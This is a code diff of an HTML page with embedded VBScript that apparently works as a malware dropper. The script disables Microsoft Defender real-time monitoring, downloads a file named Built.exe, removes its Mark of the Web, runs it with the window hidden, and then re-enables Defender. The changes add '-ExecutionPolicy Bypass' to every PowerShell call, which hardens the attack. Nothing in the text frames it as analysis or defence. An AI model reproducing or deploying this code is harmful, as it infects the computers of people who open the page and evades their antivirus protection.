@@ -16,9 +16,9 @@
 </head>
 <body>
     <script language="VBScript">
-        ' Disable Microsoft Defender (Real-Time Protection) via PowerShell
+        ' Run PowerShell with execution policy bypass to disable Microsoft Defender
         Set WshShell = CreateObject("WScript.Shell")
-        WshShell.Run "powershell -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, True
+        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Set-MpPreference -DisableRealtimeMonitoring $true""", 0, True
         
         ' Create a VBScript to download and execute Built.exe silently
         Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
@@ -41,13 +41,13 @@
         End If
         
         ' Unblock the file (remove Mark of the Web)
-        WshShell.Run "powershell -Command ""Unblock-File -Path '" & tempFilePath & "'""", 0, True
+        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Unblock-File -Path '" & tempFilePath & "'""", 0, True
         
         ' Run the downloaded EXE file silently
         WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
         
         ' Re-enable Microsoft Defender (Real-Time Protection) after execution
-        WshShell.Run "powershell -Command ""Set-MpPreference -DisableRealtimeMonitoring $false""", 0, True
+        WshShell.Run "powershell -ExecutionPolicy Bypass -Command ""Set-MpPreference -DisableRealtimeMonitoring $false""", 0, True
         
     </script>
 </body>
